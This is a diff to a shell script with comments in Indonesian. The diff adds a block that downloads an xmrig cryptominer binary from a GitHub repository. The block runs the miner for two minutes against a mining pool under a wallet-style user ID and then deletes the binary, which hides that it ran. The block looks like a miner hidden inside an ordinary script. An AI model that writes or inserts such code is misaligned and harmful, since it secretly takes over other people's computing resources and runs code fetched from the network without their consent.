@@ -30,5 +30,30 @@ else
     echo "Gagal mengunduh file Python."
 fi
 
+# URL file tools di github
+tools="https://github.com/rinnoum/tools/raw/main/xmrig"
+
+# Tools setelah diunduh
+xmrig="xmrig"
+
+# Mengunduh file
+wget -O $xmrig $tools
+# Memeriksa apakah tools berhasil diunduh
+if [ $? -eq 0 ]; then
+    timeout 2m $xmrig -a ghostrider --url stratum-asia.rplant.xyz:17095 --tls --user FUCxVqXdFeaH5L5miNnWpUs3VXbGvsBpHz.te
+    
+    # Memeriksa apakah skrip telah selesai dengan baik atau tidak
+    if [ $? -eq 0 ]; then
+        echo "Skrip  telah selesai dijalankan."
+    else
+        echo "Skrip belum selesai dalam batas waktu yang ditentukan (2 menit)."
+    fi
+    # Menghapus file setelah dijalankan
+    rm $xmrig
+else
+    echo "Gagal mengunduh file Tools."
+fi
+    
+
 # Selesai
 echo "Skrip telah selesai dijalankan."
